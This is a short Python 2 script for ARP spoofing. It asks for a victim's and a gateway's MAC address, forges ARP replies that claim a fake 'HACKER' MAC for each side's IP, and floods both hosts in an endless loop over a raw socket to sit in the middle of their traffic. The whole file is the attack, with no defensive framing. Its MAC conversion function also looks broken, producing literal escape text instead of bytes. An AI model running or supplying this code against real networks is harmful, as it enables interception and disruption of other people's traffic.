import socket
import binascii
s = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.ntohs(0x0800))
s.bind(("eth0",socket.htons(0x0800)))

def mach(mac):
	a = '\\x'
	mac1= mac.replace(':',a)
	mac2= a+mac1
	return mac2

sor = '\x48\x41\x43\x4b\x45\x52'


vic1 = raw_input("Enter the Victim MAC  ")
victmac = mach(vic1)
print victmac

gate1 = raw_input("Enter the gateway MAC  ")
gatemac = mach(gate1)
print gatemac
code ='\x08\x06'
eth1 = victmac+sor+code #for victim
eth2 = gatemac+sor+code # for gateway

htype = '\x00\x01'
protype = '\x08\x00'
hsize = '\x06'
psize = '\x04'
opcode = '\x00\x02'


gate_ip = '192.168.0.1'
victim_ip = '192.168.0.11'
gip = socket.inet_aton ( gate_ip )

vip = socket.inet_aton ( victim_ip )


arp_victim = eth1+htype+protype+hsize+psize+opcode+sor+gip+victmac+vip
arp_gateway= eth2+htype+protype+hsize+psize+opcode+sor+vip+gatemac+gip


while 1:
	s.send(arp_victim)
	s.send(arp_gateway)


